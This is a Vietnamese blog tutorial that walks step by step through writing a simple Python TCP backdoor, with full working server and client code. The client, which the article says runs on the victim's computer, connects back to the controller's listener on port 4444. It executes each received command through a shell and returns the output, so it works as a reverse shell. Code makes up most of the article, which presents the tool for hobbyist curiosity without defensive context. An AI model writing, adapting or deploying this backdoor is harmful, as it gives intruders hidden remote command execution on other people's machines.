![](https://images.viblo.asia/3b770644-4096-4cfb-889e-5ba650f0a484.jpg)


Khi nói về những vấn đề liên quan đến an toàn cho mạng và máy tính, ta sẽ bắt gặp đâu đó từ **[backdoor](https://en.wikipedia.org/wiki/Backdoor_(computing))**. Backdoor đối với tôi như một điều huyền bí và luôn thôi thúc đi tìm hiểu khám phá. Vậy backdoor là gì?

Theo cách hiểu đơn giản và phổ thông backdoor là cửa hậu và được tin tặc tạo ra để lén lút xâm nhập vào một hệ thống sau khi chúng đã xâm nhập lần đầu tiên.

Và điều khiến tôi tò mò thêm nữa là backdoor được tạo ra như thế nào? Sau những hồi mê man trên mạng Internet, tôi cũng tìm ra được cách tạo một [backdoor đơn giản bằng Python](https://medium.com/@securegns/creating-a-tcp-backdoor-using-python-9edafc213f91).

> Note: để dễ hiểu hơn thì ta nên có kiến thức cơ bản về lập trình mạng cũng như kiến thức về mạng máy tính.
> 

* Xem kiến thức về mạng máy tính: [https://vi.wikipedia.org/wiki/TCP/IP](https://vi.wikipedia.org/wiki/TCP/IP)
* Xem kiến thức về lập trình mạng: [https://www.youtube.com/watch?v=pjMRmSO4oQI&list=PLsfLgp1K1xQ67v7LiKJ59B855lv0vm5if&index=2](https://www.youtube.com/watch?v=pjMRmSO4oQI&list=PLsfLgp1K1xQ67v7LiKJ59B855lv0vm5if&index=2)

# Thông tin về backdooor
Backdoor được xây dựng theo mô hình [Client/Server](https://en.wikipedia.org/wiki/Client%E2%80%93server_model). Trong đó server do ta kiểm soát, client là máy tính của nạn nhân.

![](https://images.viblo.asia/bda2e5a1-4f1b-4862-8be2-4e15f74929f6.png)

Backdoor được viết bằng ngôn ngữ Python và sử dụng thư socket của Python.

Backdoor sử dụng giao thức TCP/IP và IPv4 để thực hiện giao tiếp giữa Client và Server.

# Bước 1 TCP Client/Server
Đầu tiên ta cần tạo được một server và client đơn giản để hiểu cách chúng tương tác với nhau.

## Server

```python
#Server 
import socket

IP = '0.0.0.0'
PORT = 4444

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind((IP, PORT))
s.listen(1)
print('Server is listening on port '+str(PORT)+' ...')
conn, addr = s.accept()
print('[+] Connected to ', addr)
conn.send(b'Hello')
response = conn.recv(1024)
print(response)
```

Đoạn code trên tạo một server lắng nghe kết nối từ client. Nhận kết nối và gửi tin đến client.

* Đầu tiên ta cần import thư viện socket của python và tạo một socket. **AF_INET** tham số cho **IPv4**, **SOCK_STREAM** tham số **TCP**.  `s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)`
* Code của ta sử dụng 2 biến `IP` và `PORT` chỉ định địa chỉ IP và cổng lắng nghe của server. IP là một chuỗi, còn PORT là số nguyên.
* Socket tạo ra không thể sử dụng lại. `s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)` để tránh gặp lỗi.
* `s.bind()` được sử dụng để liên kết socket với địa chỉ. Trong TCP socket phân biệt nhau bởi cặp IP và port. Vì vậy, tham số truyền vào là một tuple của IP và port.
* `s.listen()` server bắt đầu lắng nghe kết nối trên địa chỉ được được liên kết trước đó. Tham số truyền vào với ý nghĩa chỉ chấp nhận số lượng kết nối nhất định.
* `s.accept()` chấp nhận kết nối đến.
* `conn` là một socket mới được tạo ra được sử dụng để gửi và nhận dữ liệu với client. `addr` là địa chỉ của client.
* `conn.send()` gửi dữ liệu đến client, tham số truyền vào là một mảng byte.
* `conn.recv()` nhận dữ liệu từ client, `1024` là bộ nhớ đệm để sử dụng khi lưu trữ tạm thời dữ liệu đến từ client.
* `print(response)` in kết quả ra màn hình.

## Client
```bash
#client
import socket

IP = '127.0.0.1'
PORT = 4444

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.connect((IP, PORT))
response = s.recv(1024)
s.send(b"Hello")
print("Data sent!")
```

Client cũng sử dụng một số hàm như server.  Nhưng khác ở chỗ `s.connect()` kết nối tới IP và PORT của server đang lắng nghe.

Chạy thử và xem kết quả.

> Lưu ý: Phải chạy server trước rồi mới chạy client.

![](https://images.viblo.asia/3933e33b-4372-4581-ba0f-a5a3dedd3df1.png)

# Bước 2 Subprocess module
Để thực thi câu lệnh và nhận kết quả từ câu lệnh đó ta sử dụng `subprocess.Popen()` và `stdout.read()`.

```python
#Run 'ls' command
import subprocess
command='ls'
proc = subprocess.Popen(
    command, shell=True, 
    stdout=subprocess.PIPE, 
    stderr=subprocess.PIPE, 
    stdin=subprocess.PIPE)
output= proc.stdout.read()+proc.stderr.read()
print(output)
```

# Bước 3 hoàn thiện
Đến bước này, ta sẽ hoàn thiện backdoor bằng cách ghép các đoạn code trên lại với nhau.

Server gửi lệnh cho client và nhận kết quả trả về.

```python
#Server 
import socket
import sys

IP = '0.0.0.0'
PORT = 4444

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind((IP, PORT))
s.listen(1)
print('Server is listening on port '+str(PORT)+' ...')
conn, addr = s.accept()
print('[+] Connected to ', addr)
while True:
     sys.stdout.write('Shell>>')
     command=sys.stdin.readline()
     if command=='exit\n':
          print('[+] Close')
          conn.send(b'exit')
          conn.close()
          break
     elif command != '\n':
          conn.send(command.encode())
          output=conn.recv(1024)
          print(output)
```

Client nhận lệnh, thực hiện lệnh và trả kết quả cho server.

```python
#client
import socket
import subprocess

IP = '127.0.0.1'
PORT = 4444

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.connect((IP, PORT))
while True:
     command=s.recv(1024)
     if command == b'exit' or command == b'':
          print('[+] Close')
          s.close()
          break
     else:
          proc = subprocess.Popen(command, 
                      shell=True, 
                      stdout=subprocess.PIPE, 
                      stderr=subprocess.PIPE, 
                      stdin=subprocess.PIPE)
          output= proc.stdout.read()+proc.stderr.read()
          print(output)
          s.send(output)
```

Vậy là đã hoàn thành backdoor code bằng python. Tiếp theo, ta thực hiện chạy để kiểm nghiệm lại kết quả.

![](https://images.viblo.asia/60e94517-a6f5-40b4-8a05-9c1bb6c51e51.png)

OK! Vậy là ngon lành cành đào rồi!
Toàn bộ source ở đây: [https://github.com/com0t/backdoor-python.git](https://github.com/com0t/backdoor-python.git)